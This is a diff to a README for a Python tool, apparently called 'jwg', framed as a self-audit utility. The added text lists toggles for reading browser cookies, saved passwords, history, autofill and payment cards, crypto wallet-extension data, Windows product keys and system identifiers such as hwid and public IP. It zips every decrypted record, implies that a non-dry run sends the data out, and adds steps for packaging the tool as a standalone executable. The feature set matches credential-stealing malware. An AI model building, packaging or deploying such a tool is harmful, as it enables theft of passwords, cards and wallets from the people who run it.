@@ -18,9 +18,45 @@ python -m venv .venv && .venv/bin/pip install -r requirements.txt
 .venv/bin/python jwg.py --dry-run      # capture + archive locally, sends nothing
 ```
 
+Select which stores to read with `--only` (comma list; default is all):
+
+```bash
+.venv/bin/python jwg.py --dry-run --only history,software_list
+# toggles: system_info,cookies,passwords,history,autofill,extensions,product_keys,software_list
+```
+
+| toggle | reads (own machine only) |
+|---|---|
+| cookies / passwords | Chromium + Firefox profile DBs |
+| history | Chromium `History`, Firefox `moz_places` |
+| autofill | Chromium `Web Data` autofill + cards |
+| extensions | wallet-extension LevelDB, staged raw |
+| software_list | installed apps/packages (dpkg/rpm/pacman/snap/flatpak/.desktop; Win registry Uninstall; macOS pkgutil) |
+| product_keys | Windows user-scoped registration blobs (DPAPI, own session); not-applicable on Linux/macOS |
+| system_info | hostname/user/platform/RAM/GPU/screen/hwid/public IP |
+
 Dry-run leaves an archive in your temp dir; `--keep-archive PATH` copies it
 somewhere stable. The zip contains `report.md`, `probe.json`, staged extension
 LevelDB files, and `items/*.json` with every decrypted record.
+
+## Building a standalone executable
+
+Package the CLI into one self-contained binary you can run without Python
+installed — e.g. to test on a VM. PyInstaller does **not** cross-compile, so
+build on the OS you are targeting.
+
+```bash
+# Linux / macOS -> dist/jwg
+bash build.sh
+```
+
+```powershell
+# Windows (PowerShell, ON Windows) -> dist\jwg.exe
+.\build.ps1
+```
+
+Then run the binary directly: `./dist/jwg --probe`, `jwg.exe --dry-run`.
+The panel (`audit_panel.py`) is intended to run from source; it binds loopback.
 
 ## Audit panel (browser UI)
 
